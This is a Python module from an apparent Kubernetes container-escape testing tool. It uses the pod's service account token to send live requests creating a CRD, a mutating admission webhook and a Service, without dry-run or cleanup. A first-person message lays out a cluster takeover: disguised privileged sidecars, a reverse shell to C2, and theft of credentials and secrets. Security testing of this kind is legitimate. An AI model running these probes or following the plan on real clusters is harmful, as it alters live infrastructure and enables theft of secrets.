"""
Malicious Webhook Checker

Checks possibilities installation malicious admission webhooks.
"""

import os
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


class MaliciousWebhookChecker:
    """Checks malicious webhook installation possibilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking possibilities installation malicious admission webhooks."""
        try:
            # Checking for token for access to API
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='malicious_webhook', 
                    status='not_found', 
                    message='Service account token not found.'
                )
                
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
                
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Checking permissions on creation CRD
            crd_cmd = [
                'curl', '-s', '-X', 'POST',
                f'https://{api_server}:{api_port}/apis/apiextensions.k8s.io/v1/customresourcedefinitions',
                '--header', f'Authorization: Bearer {token}',
                '--header', 'Content-Type: application/json',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '--data', '{"apiVersion":"apiextensions.k8s.io/v1","kind":"CustomResourceDefinition","metadata":{"name":"vulnerabilitytests.security.test"},"spec":{"group":"security.test","versions":[{"name":"v1","served":true,"storage":true,"schema":{}}],"scope":"Namespaced","names":{"plural":"vulnerabilitytests","singular":"vulnerabilitytest","kind":"VulnerabilityTest"}}}'
            ]
            
            crd_rc, crd_out, _ = await run_exec(crd_cmd, timeout=5)
            can_create_crd = crd_rc == 0 and "Forbidden" not in (crd_out or "")
            
            # Checking permissions on creation webhook
            webhook_cmd = [
                'curl', '-s', '-X', 'POST',
                f'https://{api_server}:{api_port}/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations',
                '--header', f'Authorization: Bearer {token}',
                '--header', 'Content-Type: application/json',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '--data', '{"apiVersion":"admissionregistration.k8s.io/v1","kind":"MutatingWebhookConfiguration","metadata":{"name":"test-webhook"},"webhooks":[{"name":"test.k8s.io","clientConfig":{"url":"https://example.com"},"rules":[{"apiGroups":[""],"apiVersions":["v1"],"operations":["CREATE"],"resources":["pods"]}],"admissionReviewVersions":["v1"],"sideEffects":"None","timeoutSeconds":5}]}'
            ]
            
            wh_rc, wh_out, _ = await run_exec(webhook_cmd, timeout=5)
            can_create_webhook = wh_rc == 0 and "Forbidden" not in (wh_out or "")
            
            namespace = (await asyncio.to_thread(lambda: open("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "r").read())).strip()
            
            # Checking permissions on creation services
            service_cmd = [
                'curl', '-s', '-X', 'POST',
                f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/services',
                '--header', f'Authorization: Bearer {token}',
                '--header', 'Content-Type: application/json',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '--data', '{"apiVersion":"v1","kind":"Service","metadata":{"name":"test-webhook-service"},"spec":{"ports":[{"port":443,"targetPort":8443}],"selector":{"app":"test-webhook"}}}'
            ]
            
            svc_rc, svc_out, _ = await run_exec(service_cmd, timeout=5)
            can_create_service = svc_rc == 0 and "Forbidden" not in (svc_out or "")
            
            if can_create_webhook or (can_create_crd and can_create_service):
                demo_next = "Jackpot! detected possibility to create webhooks and/or CRD in cluster. Now will create malicious MutatingWebhook, which will intercept creation of ALL pods in cluster. My webhook will add to each created pod sidecar-container with privileged mode and access to host system via hostPath-mounting. For masquerading will give container name, similar to known sidecars like istio-proxy or envoy. In this container will place reverse-shell, which will connect to my C2 server. Also will add injection of environment variables with secrets into target containers. Since MutatingWebhook fires BEFORE validation and authorization, I can bypass practically any security limitations of cluster. For greater stealth will create own CRD, which will control my malicious infrastructure. And in webhook-server will add automatic collection of credentials from environment and volumes of all intercepted pods. With obtained admin-rights will copy all cluster secrets, including service account tokens with high privileges."
                return EscapeAttemptResult(
                    method='malicious_webhook', 
                    status='exploited', 
                    message=f'detected possibility creation malicious webhook/CRD. Webhook: {"yes" if can_create_webhook else "no"}, CRD: {"yes" if can_create_crd else "no"}, service: {"yes" if can_create_service else "no"}',
                    demo_next_steps=demo_next
                )
                
            return EscapeAttemptResult(
                method='malicious_webhook', 
                status='not_vulnerable', 
                message='Possibility of creating malicious webhook/CRD not detected.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='malicious_webhook', status='error', message=str(e))

